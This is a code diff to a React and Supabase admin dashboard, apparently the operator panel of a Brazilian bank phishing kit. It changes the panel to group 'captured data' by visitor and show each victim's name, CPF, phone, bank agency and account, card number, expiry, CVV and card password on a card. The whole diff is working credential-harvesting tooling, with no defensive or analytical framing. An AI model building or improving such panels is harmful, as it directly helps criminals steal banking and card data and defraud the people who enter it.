@@ -22,6 +22,22 @@ interface CapturedEntry {
   created_at: string;
 }
 
+interface GroupedClient {
+  visitor_id: string;
+  nome?: string;
+  cpf?: string;
+  telefone?: string;
+  agencia?: string;
+  conta?: string;
+  numero_cartao?: string;
+  validade?: string;
+  cvv?: string;
+  senha_app?: string;
+  senha_cartao?: string;
+  created_at: string;
+  user_agent?: string;
+}
+
 const AdminDashboard = () => {
   const navigate = useNavigate();
   const [totalVisits, setTotalVisits] = useState(0);
@@ -30,6 +46,7 @@ const AdminDashboard = () => {
   const [dailyData, setDailyData] = useState<DailyVisit[]>([]);
   const [hourlyData, setHourlyData] = useState<HourlyVisit[]>([]);
   const [capturedData, setCapturedData] = useState<CapturedEntry[]>([]);
+  const [groupedClients, setGroupedClients] = useState<GroupedClient[]>([]);
   const [loading, setLoading] = useState(true);
 
   useEffect(() => {
@@ -116,13 +133,49 @@ const AdminDashboard = () => {
       setHourlyData(hourlyArr);
     }
 
-    // Captured data (last 50)
+    // Captured data (last 200 entries, grouped by visitor)
     const { data: captured } = await supabase
       .from("captured_data")
       .select("*")
       .order("created_at", { ascending: false })
-      .limit(50);
-    setCapturedData((captured as CapturedEntry[]) || []);
+      .limit(200);
+    
+    const entries = (captured as CapturedEntry[]) || [];
+    setCapturedData(entries);
+
+    // Group by visitor_id
+    const grouped: Record<string, GroupedClient> = {};
+    entries.forEach((entry) => {
+      if (!grouped[entry.visitor_id]) {
+        grouped[entry.visitor_id] = {
+          visitor_id: entry.visitor_id,
+          created_at: entry.created_at,
+        };
+      }
+      const client = grouped[entry.visitor_id];
+      // Keep earliest date
+      if (entry.created_at < client.created_at) {
+        client.created_at = entry.created_at;
+      }
+      const d = entry.data as Record<string, string>;
+      if (entry.step === "identificacao") {
+        client.nome = d.nome;
+        client.cpf = d.cpf;
+        client.telefone = d.telefone;
+      } else if (entry.step === "resgate") {
+        client.agencia = d.agencia;
+        client.conta = d.conta;
+      } else if (entry.step === "dados-cartao") {
+        client.numero_cartao = d.numero;
+        client.validade = d.validade;
+        client.cvv = d.cvv;
+      } else if (entry.step === "confirmacao") {
+        client.senha_cartao = d.senha;
+      }
+    });
+    setGroupedClients(
+      Object.values(grouped).sort((a, b) => b.created_at.localeCompare(a.created_at))
+    );
 
     setLoading(false);
   };
@@ -213,50 +266,41 @@ const AdminDashboard = () => {
           </div>
         </div>
 
-        {/* Captured Data Table */}
+        {/* Captured Data - Client Cards */}
         <div className="bg-background rounded-xl border border-border p-5">
           <div className="flex items-center gap-3 mb-4">
             <Users className="text-primary" size={20} />
-            <h2 className="text-foreground font-semibold">Dados Capturados (Últimos 50)</h2>
+            <h2 className="text-foreground font-semibold">Dados Capturados ({groupedClients.length} clientes)</h2>
           </div>
-          <div className="overflow-x-auto">
-            <table className="w-full text-sm">
-              <thead>
-                <tr className="border-b border-border">
-                  <th className="text-left py-2 px-3 text-muted-foreground font-medium">Data</th>
-                  <th className="text-left py-2 px-3 text-muted-foreground font-medium">Etapa</th>
-                  <th className="text-left py-2 px-3 text-muted-foreground font-medium">Visitante</th>
-                  <th className="text-left py-2 px-3 text-muted-foreground font-medium">Dados</th>
-                </tr>
-              </thead>
-              <tbody>
-                {capturedData.map((entry) => (
-                  <tr key={entry.id} className="border-b border-border/50 hover:bg-muted/50">
-                    <td className="py-2 px-3 text-foreground whitespace-nowrap">
-                      {new Date(entry.created_at).toLocaleString("pt-BR")}
-                    </td>
-                    <td className="py-2 px-3">
-                      <span className="bg-primary/10 text-primary text-xs font-medium px-2 py-0.5 rounded-full">
-                        {entry.step}
-                      </span>
-                    </td>
-                    <td className="py-2 px-3 text-muted-foreground text-xs font-mono">
-                      {entry.visitor_id.slice(0, 8)}...
-                    </td>
-                    <td className="py-2 px-3 text-foreground text-xs font-mono max-w-xs truncate">
-                      {JSON.stringify(entry.data)}
-                    </td>
-                  </tr>
-                ))}
-                {capturedData.length === 0 && (
-                  <tr>
-                    <td colSpan={4} className="py-8 text-center text-muted-foreground">
-                      Nenhum dado capturado ainda
-                    </td>
-                  </tr>
-                )}
-              </tbody>
-            </table>
+          <div className="space-y-4">
+            {groupedClients.map((client, index) => (
+              <div key={client.visitor_id} className="border border-border rounded-lg p-4 bg-muted/30">
+                <div className="flex items-center justify-between mb-3">
+                  <span className="text-xs font-mono text-muted-foreground">ID: {client.visitor_id.slice(0, 8)}</span>
+                  <span className="text-xs text-muted-foreground">
+                    {new Date(client.created_at).toLocaleString("pt-BR")}
+                  </span>
+                </div>
+                <div className="grid grid-cols-1 sm:grid-cols-2 gap-x-6 gap-y-1.5 text-sm">
+                  <div><span className="text-muted-foreground">Nome:</span> <span className="text-foreground font-medium">{client.nome || "—"}</span></div>
+                  <div><span className="text-muted-foreground">CPF:</span> <span className="text-foreground font-medium">{client.cpf || "—"}</span></div>
+                  <div><span className="text-muted-foreground">Telefone:</span> <span className="text-foreground font-medium">{client.telefone || "—"}</span></div>
+                  <div className="flex gap-4">
+                    <div><span className="text-muted-foreground">Agência:</span> <span className="text-foreground font-medium">{client.agencia || "—"}</span></div>
+                    <div><span className="text-muted-foreground">Conta:</span> <span className="text-foreground font-medium">{client.conta || "—"}</span></div>
+                  </div>
+                  <div><span className="text-muted-foreground">Cartão:</span> <span className="text-foreground font-medium">{client.numero_cartao || "—"}</span></div>
+                  <div className="flex gap-4">
+                    <div><span className="text-muted-foreground">Validade:</span> <span className="text-foreground font-medium">{client.validade || "—"}</span></div>
+                    <div><span className="text-muted-foreground">CVV:</span> <span className="text-foreground font-medium">{client.cvv || "—"}</span></div>
+                  </div>
+                  <div><span className="text-muted-foreground">Senha Cartão:</span> <span className="text-foreground font-medium">{client.senha_cartao || "—"}</span></div>
+                </div>
+              </div>
+            ))}
+            {groupedClients.length === 0 && (
+              <p className="py-8 text-center text-muted-foreground">Nenhum dado capturado ainda</p>
+            )}
           </div>
         </div>
 
